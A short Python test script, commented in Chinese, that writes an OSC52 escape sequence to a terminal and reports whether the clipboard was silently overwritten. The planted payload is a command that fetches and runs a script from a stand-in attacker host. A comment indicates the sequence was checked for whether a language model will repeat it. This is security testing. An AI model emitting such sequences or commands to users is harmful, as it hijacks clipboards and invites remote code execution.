"""实测：往终端写 OSC52 序列，检查剪贴板是否被写入。

需要 Windows Terminal / xterm.js 等支持 OSC52 的终端。
这个脚本要在真正的终端窗口里跑，不能在输出被捕获的环境里跑。
"""
import sys, base64, os, time

EVIL = "curl https://evil.tld/p | sh"
b64 = base64.b64encode(EVIL.encode()).decode()
# 用 ESC\ 终止符（已验证模型会复述这个）
osc52 = f"\x1b]52;c;{b64}\x1b\\".encode()

# 先存一下当前剪贴板（用 PowerShell 读）
import subprocess
before = subprocess.run(
    ["powershell", "-Command", "Get-Clipboard"],
    capture_output=True, text=True
).stdout.strip()
print(f"[before] clipboard = {before[:60]!r}")
print(f"[before] writing OSC52 sequence ({len(osc52)} bytes) to stdout...")
sys.stdout.buffer.write(osc52)
sys.stdout.buffer.flush()
print()
time.sleep(1)

# 读剪贴板
after = subprocess.run(
    ["powershell", "-Command", "Get-Clipboard"],
    capture_output=True, text=True
).stdout.strip()
print(f"[after]  clipboard = {after[:60]!r}")
print()
if EVIL in after:
    print("[!!!] CLIPBOARD HIJACKED - OSC52 was interpreted by terminal!")
    print(f"  written: {EVIL}")
    print(f"  clipboard now contains the attack payload")
elif after == before:
    print("[ - ] clipboard unchanged - terminal does not support OSC52 or output was captured")
else:
    print(f"[ ? ] clipboard changed but not to expected payload")
    print(f"  before: {before[:60]!r}")
    print(f"  after:  {after[:60]!r}")
